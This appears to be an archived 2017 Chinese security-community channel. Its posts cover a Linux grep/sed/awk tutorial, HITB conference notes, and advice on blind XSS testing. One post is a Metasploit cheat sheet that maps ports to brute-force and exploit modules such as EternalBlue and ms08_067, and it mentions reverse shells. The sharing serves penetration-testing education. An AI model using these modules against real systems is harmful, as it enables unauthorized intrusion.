<img src="https://images.xiaomiquan.com/Fkn83Kq9msBwJrn804arEKfpaYQN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-I0LRfQgpTajMTtXydf-mD0kxnQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 感觉信息收集没写完……

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 可以补充呀，相互交流嘛

<img src="https://file.xiaomiquan.com/73/4f/734f2c7364f4ef86e936145ef88229d700ac299eb89414ded45da3c1923caa9e.jpg" width="25px"/> __苏少‮蛋脸小的你下一了亲并‭__: 用nslookup 并不能查出所有基于该域名的信息，是嘛


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

  Linux下的“三剑客”

分享来自@嘀嗒的钟  

前段时间，因为工作需求，需要对大量的脏数据以及日志数据搭建数据库进行统计分析，在数据清洗入库阶段，发现“三剑客”在处理文本内容上的极大优势和效率，故对这个三个命令进行了整理， 分享给大家。

在Linux系统当中，处理文本有三个常用的模式匹配命令 grep sed awk ，这三个命令十分灵活，熟练掌握对你在Linux下文本处理效率有极大的提高。

grep的全称为： Global search Regular Expression and Print out the line，是的，你英文理解对了，grep命令主要用来查找字符串，具体命令可以像下面那样

#匹配含有root字符串的行，并打印行号
> cat /etc/passwd | grep -n 'root'
或这样

#获取本机的IP地址和子网掩码
> ifconfig | grep -E -o --color "\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>"
grep 常用的参数

-i 表示搜索字符串的时候不区分大小写
-n 显示行号
-c 只显示匹配到的行数，不显示具体的内容
-o 只显示符合条件的字符串，但不显示整行
-v 显示不含关键字的行
-q 静默匹配模式，不输出任何信息，所以若要查看匹配的结果，需要使用echo $?来查看
-e 实现多个表达式的匹配
-w 精确匹配，及只匹配整个字符串
-Ax 显示匹配表达式之前的x行
-Bx 显示匹配表达式之后的x行
-Cx 显示匹配表达式前后各x行
-p 兼容perl的正则引擎
-E 使用扩展正则表达式
--color 对匹配关键字进行高亮显示
此外，grep还有一些不常用的参数，有兴趣的可以输入如下命令来细细把玩， 像这样

man grep

grep还有两个兄弟命令，分别为egrep， fgerp。

egrep命令，支持扩展正则表达式，相当于grep -E

fgrep命令，不支持正则表达式，只能匹配固定的字符串，相当于grep -w，但是fgrep的搜索速度要比grep -w快很多。

sed命令，sed的全称为stream editor，sed在处理时一次只读取文件的一行并对这一行进行处理，并且sed将处理后的数据只会显示在屏幕上，并不会对原文件进行修改，所以说sed是一个行编辑器。具体命令可以像下面那样

#删除/etc/passwd文件中的空白行
> sed "/^$/d" /etc/passwd
或这样

#替换/etc/inittab文件中”id:3:initdefault:"一行中的数字为5
> sed 's@\(id:\)[0-9]\(:initdefault\)@\15\2' /etc/inittab
sed常用参数

 -n：静默模式，不输出模式空间内的内容，默认打印空间模式内的内容
 -r：扩展的正则表达式
 -f 文件：指定sed脚本文件
 -i：直接编辑源文件
 #编辑命令
 d：删除
 p：打印
 i \:在被指定到的行前面插入文本
 a \:在被指定到的行下面插入文本
 r 文件路径：在指定的位置插入另外一个文件的内容
 w 文件路径：将符合条件的所有行保存至指定的文件中
 = 显示符合条件的所在行的行号
同样，有兴趣的可以输入如下命令来细细把玩，像这样

man sed

awk命令，awk是由Alfred Aho 、Peter Weinberger 和 Brian Kernighan这三个人创造的，awk由这个三个人的姓氏的首个字母组成。awk早期是在unix上实现的，所以，我们现在在linux的所使用的awk其实是gawk，也就是GNU awk，简称为gawk，awk还有一个版本，New awk，简称为nawk，但是linux中最常用的还是gawk。

awk基本语法

> awk [option] 'Pattern{Action}' file
awk常用参数

-v 设置变量的值
-F 指定分隔符, awk内部变量FS也可以实现分隔符的效果，像这样： -v FS=":"
awk常用内置变量

FS：输入字段分隔符， 默认为空白字符
OFS：输出字段分隔符， 默认为空白字符
RS：输入记录分隔符(输入换行符)， 指定输入时的换行符
ORS：输出记录分隔符（输出换行符），输出时用指定符号代替换行符
NF：number of Field，当前行的字段的个数(即当前行被分割成了几列)，字段数量
NR：行号，当前处理的文本行的行号。
FNR：各文件分别计数的行号
FILENAME：当前文件名
ARGC：命令行参数的个数
ARGV：数组，保存的是命令行所给定的各参数
Action就是动作，awk中最常用的两个动作print， printf。

Pattern就是模式，通俗的讲就是条件，awk常用的模式有 BEGIN模式，END模式，关系表达式模式，正则表达式模式。

具体命令可以像下面那样

> df | awk 'BEGIN{print "begining"} {print $0} END{print "ending"}'
或像这样

# 利用awk分割和格式化能力，可以直接对数据清洗入库
> cat file | awk -F: '{ if(NF == 5) { printf "INSERT INTO table_name (col1, col2,...) VALUES (%s, %s,....)\n", $1, $2, $3, $4, $5 } }' file
同样，有兴趣的可以输入如下命令来细细把玩，像这样

man awk

[总结]

grep适合单纯的查找字符或者匹配文本，当然可以结合bash or python脚本， 实现对某个目录下字符串的查找；sed则更适合于编辑文本；awk 更适合文本格式化，这个在大数据清洗的时候，很好用。本文只是介绍了这三个命令的低阶用法，高阶用法需要大家在熟练掌握三个命令后结合实际的工作场景

另外， 推荐一张linux下常用命令的基础技能表（如图）。

[参考资料]

之前记得@余弦  曾经推荐过一系列书，其中有一本讲软件设计的书《Software Design 中文版 03》，这本书其实是日本的计算机杂志，每个月都有一期（目前还在出），但是国内的出版社貌似也就翻译了这一期，没有后续可惜了。这本杂志用了不少篇幅在讲sed和awk编程， 非常不错，我当初就是冲着awk买的，没有找到电子版，放个链接《Software Design 中文版 03》：


[《Software Design 中文版 03》【摘要 书评 试读】- 京东图书](https://item.jd.com/11688328.html)

 

另外，这里推荐一个国人写的awk的教程：


[awk | 朱双印博客](http://www.zsythink.net/archives/tag/awk/)

 

之前ke@ATToT分享iptables的时候，已经推荐了这个作者，确实很棒，写得非常详细。

<img src="https://images.xiaomiquan.com/FnlEIcOrNLL_S3yPQhQQ2EyPAwWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jK4vljZeFyVCAvpVwQJWiXwN3Iw=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 很认真的分享，特别感谢！

<img src="https://file.xiaomiquan.com/53/47/5347354a88eb4ffccc47774564dbc1da7c4951492cc33532ae19d05075008cbf.jpg" width="25px"/> __缘起是源__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 弦哥，你linux用的是哪个版本呀😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/53/47/5347354a88eb4ffccc47774564dbc1da7c4951492cc33532ae19d05075008cbf.jpg" width="25px"/> __缘起是源__: 一般会升级到最新发行版，Ubuntu、Arch都用

<img src="https://file.xiaomiquan.com/87/b2/87b217dbd34242e97b5f6a7a29bcc77846a20a135c5f3f4202ef559f56cfd0c3.jpg" width="25px"/> __刘二和__: 朱哥的博客厉害了


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-27:

MSF内网渗透系列——端口渗透

不多说了，端口检测备忘录，整理常用端口对应MSF的相关模块。欢迎补充

port：21 （FTP）
>auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破
>其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell内网常见
port:22  (SSH)
>auxiliary/scanner/ssh/ssh_login    //SSH登陆爆破
>其它：search SSH
port:23  (telnet)
>auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备
port:80，8080，443 (附：web服务常见端口整理，见图)
>http服务，内网开放的web服务安全性往往比较差，注入，弱口令...web渗透在内网依然重要
port:445 (简直无需多说的端口）
 exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜
>exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝
>auxiliary/scanner/smb/smb_login             //SMB登陆爆破
>其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用
port:3389   (远程桌面RDP)
>auxiliary/scanner/rdp/ms12_020_check 
5900  (VNC)
>auxiliary/scanner/vnc/vnc_none_auth
>auxiliary/scanner/vnc/vnc_login
>exploit/multi/vnc/vnc_keyboard_exec
数据库：
port:1433  （Sqlserver）
>use auxiliary/scanner/mssql/mssql_login   //sa爆破
port:3306   (Mysql)
>auxiliary/scanner/mysql/mysql_login
port: 27017、27018 (Mongodb)
>auxiliary/scanner/mongodb/mongodb_login
port:6379  （Redis）
>auxiliary/scanner/redis/redis_login
>auxiliary/scanner/redis/file_upload
port:1521   (Oracle)
>search Oracle
port:5432   (PostgreSQL)
>search PostgreSQL

<img src="https://images.xiaomiquan.com/FmgaMfoaZoU0EwdMgVnjSM93Sdeo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:vQF74cjllAa2OqTa3lpWOz4oFS8=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e4/b4/e4b46552510c6ae0660244095fca260401a18af22f2746c0aeeae86e99b6abb8.jpg" width="25px"/> __罗钦__: 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-26:

> Vesper 提问：
碰到一个伪静态站。XSS提交留言需审核，登录页点不出来，看了源码无奈学艺不精，有点焦灼，无头苍蝇。希望余弦大大能科普一下这方面的渗透技巧，给我指一下路。


可以用 XSS 盲打呀，可以拿 XSS'OR 去做盲打测试，如果不仅是测试，自己可以 fork XSS'OR，修改代码很容易，就可以打造一个自己的盲打平台。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-25:


__#HITB#__

  HITB 创始人最后致辞，结束，明年10月会在北京办一场。非常期待国际黑客大会走进中国！

好啦，我的“直播”结束，花絮什么的很多，我会抽空写公众号文章出来。

会场很忙，就这样。😄

<img src="https://images.xiaomiquan.com/Fnr8UQ015CJYmC2UqhP1m6uNrhcs?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Spqp6nFahW2Rcf-uMZGSmgsWdN0=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FlHvlezHN3OdbLkCNnYjclcY4fFF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:kL3vgXq2CoIhc9Ri1rynT5hmBK8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FndPeWV7df5XUNxNZcPA7Hv6RFat?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WZuw5qYGQ-UJ6vE6QtDnz8SN9ns=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: HITB议会跟ctf是同时开的吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 是的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-25:


__#HITB#__

  推荐《Threat Hunting 101: Become The Hunter》，如何成为威胁猎人。

顾名思义，就是能很好发现威胁的安全人员。

需要掌握攻击技巧、网络分析、恶意分析、内存分析、主机分析等能力。需要整合 Red Team 与 Blue Team 的双重身份与能力。

这篇 Paper 也提到了 Kill Chain（攻击链），不过和之前提的“洛马七步杀”有些不一样，他们（Contercept，这个团队最近在永恒之蓝的对抗上出了些名气）里面提的步骤包括：

1. Recon
2. Delivery
3. Exploit
4. C2
5. Privilege Escalation
6. Lateral Movement
7. Objective

展开提了红蓝对抗的这些点，作为参考很不错。


__分享文件:__
[COMMSEC D1 - Hamza Beghal - Threat Hunting 101 -  Become the Hunter.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-25:


__#HITB#__

  推荐《Threat Hunting 101: Become The Hunter》，如何成为威胁猎人。

顾名思义，就是能很好发现威胁的安全人员。

需要掌握攻击技巧、网络分析、恶意分析、内存分析、主机分析等能力。需要整合 Red Team 与 Blue Team 的双重身份与能力。

这篇 Paper 也提到了 Kill Chain（攻击链），不过和之前提的“洛马七步杀”有些不一样，他们（Contercept，这个团队最近在永恒之蓝的对抗上出了些名气）里面提的步骤包括：

1. Recon
2. Delivery
3. Exploit
4. C2
5. Privilege Escalation
6. Lateral Movement
7. Objective

展开提了红蓝对抗的这些点，作为参考很不错。


__分享文件:__
[COMMSEC D1 - Hamza Beghal - Threat Hunting 101 -  Become the Hunter.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  今天最后的一个议题，和 SSRF 有关的，也是很期待的一个，来自台湾的 Orange。

大家可以看之前他的这篇，一个很棒的 exploit 过程：

[【BlackHat 2017 议题剖析】连接的力量：GitHub 企业版漏洞攻击链构造之旅](http://paper.seebug.org/363/)



之前说了，SSRF 是新 Web 安全里非常重要的一项，之前在本圈也发过相关资料，大家可以自行搜索。

会后我们交流了一个多小时，很 nice。大家对 Red Team 有发自内心的激情。几个来自不同国家与区域的安全人员，交流甚欢。


__分享文件:__
[D1 - Orange Tsai - A New Era of SSRF – Exploiting URL Parsers in Trending Programming Languages.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/e4/cc/e4cc0420fce5f31a14ca22f1ae4a88a807c04505e136ca1656af002fca530253.jpg" width="25px"/> __风蕼__: 刚进来的纯小白，面对小密圈这种……怎么说呢，想看过去的内容像掉进鼠精洞里。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e4/cc/e4cc0420fce5f31a14ca22f1ae4a88a807c04505e136ca1656af002fca530253.jpg" width="25px"/> __风蕼__: 🤣慢慢习惯就不会了

<img src="https://file.xiaomiquan.com/e4/cc/e4cc0420fce5f31a14ca22f1ae4a88a807c04505e136ca1656af002fca530253.jpg" width="25px"/> __风蕼__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 加来前还在想两百是充eve，还加圈子好，最后还是选择了加圈子😏

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e4/cc/e4cc0420fce5f31a14ca22f1ae4a88a807c04505e136ca1656af002fca530253.jpg" width="25px"/> __风蕼__: 😄

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 希望多分享点ssrf的例子


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-08-24:

xcon最后一个议题。。。邮件，水坑是很多非美方apt的起手式

<img src="https://images.xiaomiquan.com/Fgc-ecISlqtXNaHh7NG4JcQ1eYrZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:85dShWnrS5MU1u1B0kyDUsp8sHo=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 现在到处都在提洛马七步杀，哈哈哈


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  
__#福利#__

  刚刚逛厂商，看到一家摆出了这个，打开一看，惊喜了。

正是我们感兴趣的，哈哈。Python、PowerShell、CMD、Bash 的黑技巧。

原图给大家收藏。

<img src="https://images.xiaomiquan.com/FtHgBobVyPc7Qt8Qy8tXI7cgQc6H?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3WRynGY_hgXSpOEFMFLWXfIUBIc=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FkY65wMZm0J9Dm9MUbyqxjADkXRz?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mvBVVsH2y-h0DzWlTty38GWzTW8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrHRUsP5y403NBAzNULmRLK-09CI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RuwFdc4wmXaeE9LnYU7SVJhAqPU=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 中文的也可以出一份，谁来？😏

<img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: 翻译过该网站两篇关于Powershell的技巧😄：
[【技术分享】手把手教你使用PowerShell内置的端口扫描器 - 安全客 - 有思想的安全新媒体](http://bobao.360.cn/learning/detail/3961.html)



<img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: 以及：
[【技术分享】手把手教你使用PowerShell内置的端口扫描器 - 安全客 - 有思想的安全新媒体](http://bobao.360.cn/learning/detail/3961.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: 赞


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  A Year In The Red，这个 PPT 含金量挺高的，不过很多细节还是得自己去玩。

里面介绍了他们及别人研发的好工具，这都还好，里面的 Domain Fronting 技巧来做 C&C 隐蔽的可以关注看看，虽然之前我也研究过...

在听这个的时候，一位新西兰老外问我们 Red Team 在中国怎么叫，我们说：红队。

Red Team 的叫法流行了，我们就是以 Red Team（攻击）的出发点去做 Blue Team（防御）的事。

下午有事，不直播了，不过遇到什么好玩的会随时发。


__分享文件:__
[D1 - Dominic Chell and Vincent Yiu - A Year In The Red.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  早上最期待的议题来了，红队！

刚刚看到公布的一个调研工具：

LinkedInt

[GitHub - mdsecactivebreach/LinkedInt: LinkedInt: A...](https://github.com/mdsecactivebreach/LinkedInt)


A LinkedIn scraper for reconnaissance during adversary simulation.

专门针对 LinkedIn 做调研的小工具。

<img src="https://images.xiaomiquan.com/Fmn1t20J7ksEIixJrByTU-Z3ghS2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3TQMyMsGsS_2OUTMigAi6nD7kHQ=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  HITB 新加坡这两天相关演讲议题都会在这公布：


[Index of /materials/sg2017](https://gsec.hitb.org/materials/sg2017/)

 

每个议题一结束就会公开 PPT，随时关注就好，

今天是演讲日第一天。

<img src="https://images.xiaomiquan.com/FvIrCzm9b5uy59nh7x_T6qqjaRAt?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:SnDVTuYEVMqM8iPYwqWW9e6D-Zc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这两天的所有议题安排在这：

[Training   Conference Agenda « HITB GSEC – Singapo...](https://gsec.hitb.org/sg2017/agenda/)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  本来没打算听这个议题《Spy vs. Spy. A modern study of mic bugs operation and detection》，不过正好听到，这些无线电黑技术很有意思，哈哈。

无线电黑“间谍”领域，我不熟，老司机杨哲有更高端的玩法。

这两演讲者讲得还是挺不错的，很清晰。

<img src="https://images.xiaomiquan.com/FgVLMiJIiZR9VV1bnTRgJbgUsl5l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:N9FXZY0OmFnGa2Amz4VvH70gROo=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvSNiva9nblbtc13conJ3YHQacBo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PCt1A2V3Qq-QYCU2lD_uiq4LvZg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FnkPo5GNVITra22_F2eRGMWBnuf2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:kRQ4D3Ilw8wXHBc_7Yin4WOm7vU=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrQ-OjE94Nh06x48kaUiFkAPxMhC?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Z_KtHnb0pYP2KGmGD-yxj0TXmAA=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FhQnWtl5Wr-S-m-20T5yGzvyz1Ir?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2N1tO3w5xkjBSTksxa18UR_lyXg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fht7BbGU-mV5er7ce1vchjNWIY8n?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zLV55OPqD-7LXAIBgZkAmNWmHd0=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FhYWOqKmIb-2FPy6J0xleDY3SziI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Gcmzgs3LOgPixaSBnexCZd4huTE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FsZs6KCND0CmUomoHeFsNyQ5L0gF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:yGOgJQFf0PhadvzQqmKepw75vtY=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvkxlgNZuUItFTbAid6fOk8FRBEY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Zuv1ixKweliSSnZ8RkY_u8cu0Ss=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 杨叔：没有番号，谢谢。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  这个议题是《A deep dive into the digital weapons of the north korean cyber army》，研究朝鲜黑客的，演讲者来自台湾。

挺有趣的话题，他们研究恶意软件和利用工具里的特性，比如代码片段、逻辑、C&C、特殊字符串等，然后找出共性，他们把这个共性成为 Legos（乐高积木），他们准备在 GitHub 上开放这些，这个引来不少讨论，因为开放这些，作为攻击者来说，可以混淆学习呀。

还不够震撼，哈哈，现场有人期待的震撼是：他们黑进朝鲜，拿到更确定的证据。

<img src="https://images.xiaomiquan.com/Fsynbx87zHBtrm0VMX2FstzOeawN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:oXhsgXmCiip_cgbddgMCkpbNf5c=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fs83HejbgrIhXZ4W8elUizJ0lIna?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Y3xrgUJTYXIeHzvIFtjcdaJ4X-g=" width="50%" height="50%" align="middle"/>
